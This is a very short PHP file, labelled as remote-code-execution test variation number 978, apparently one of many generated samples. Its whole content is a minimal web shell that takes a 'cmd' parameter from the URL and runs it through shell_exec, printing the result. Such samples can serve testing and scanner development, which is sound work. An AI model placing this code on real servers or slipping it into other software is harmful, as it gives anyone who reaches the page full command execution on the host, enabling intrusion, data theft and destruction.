<?php
// RCE test variation #978
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>